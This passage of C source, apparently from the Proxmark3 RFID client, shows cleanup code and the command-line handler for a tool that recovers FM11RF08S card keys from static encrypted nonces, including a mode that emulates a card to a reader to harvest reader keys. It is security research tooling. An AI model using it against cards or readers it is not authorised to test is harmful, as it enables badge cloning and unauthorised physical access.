    retval = fm11_save_recovery_outputs(&card, &nonces, keys_found, found_key, no_oob, collected_with_data);
    PrintAndLogEx(SUCCESS, "time in sen " _YELLOW_("%.0f") " seconds", (float)(msclock() - t1) / 1000.0);

out:
    fm11_reuse_index_free(&reuse_index);
    fm11_keylist_free(&confirmed_reuse_keys);
    fm11_keylist_free(&default_keys);
    for (uint8_t sec = 0; sec < FM11RF08S_SECTORS; sec++) {
        fm11_keylist_free(&candidates[sec][0]);
        fm11_keylist_free(&candidates[sec][1]);
    }
    return retval;
}

int CmdHF14AMfSEN(const char *Cmd) {
    CLIParserContext *ctx;
    CLIParserInit(&ctx, "hf mf sen",
                  "Recover FM11RF08S keys using static encrypted nonce evidence in native client code",
                  "hf mf sen\n"
                  "hf mf sen --keep-nonces\n"
                  "hf mf sen --no-oob\n"
                  "hf mf sen --reader\n");
    void *argtable[] = {
        arg_param_begin,
        arg_lit0(NULL, "keep-nonces", "save collected nonce/data JSON evidence"),
        arg_lit0(NULL, "no-oob", "do not include FM11RF08S out-of-bounds sector 32 in key file"),
        arg_lit0(NULL, "reader", "pre-pass: emulate this UID to a reader and digest recovered reader keys"),
        arg_lit0(NULL, "offline-only", "stop after offline filtering, do not verify online"),
        arg_lit0(NULL, "online-confirm", "only do online confirmation (skip generation if nonces loaded)"),
        arg_int0(NULL, "max-online-candidates", "<n>", "abort online phase if total candidates exceed this limit"),
        arg_str0(NULL, "parity-mask", "<hex>", "parity filter mask 1..F (default 1 = vetted staticnested_1nt behavior)"),
        arg_param_end
    };
    CLIExecWithReturn(ctx, Cmd, argtable, true);
    bool keep_nonces = arg_get_lit(ctx, 1);
    bool no_oob = arg_get_lit(ctx, 2);
    bool reader_mode = arg_get_lit(ctx, 3);
    bool offline_only = arg_get_lit(ctx, 4);
    bool online_confirm = arg_get_lit(ctx, 5);
    int max_online_candidates = arg_get_int_def(ctx, 6, 0);
    /* Only bit 0 (byte 0 parity) carries reliable data leakage from FM11RF08S.
     * Bits 1-3 are not valid keystream leakage for this card variant - using
     * them filters out correct keys.  Override via --parity-mask if needed for
     * any weird chinese clones, normally you should never use this parameter. */
    uint8_t parity_mask = 0x1;
    {
        int pm_len = 0;
        char pm_str[8] = {0};
        if (arg_get_str_len(ctx, 7) > 0) {
            CLIGetStrWithReturn(ctx, 7, (uint8_t *)pm_str, &pm_len);
            unsigned long pm_val = strtoul(pm_str, NULL, 16);
            if (pm_val >= 1 && pm_val <= 0xF) {
                parity_mask = (uint8_t)(pm_val & 0x0F);
            }
        }
    }
    (void)online_confirm;
    CLIParserFree(ctx);

    return HFMFSENRecover(keep_nonces, no_oob, reader_mode, offline_only, max_online_candidates, parity_mask, false, NULL, 0);
}
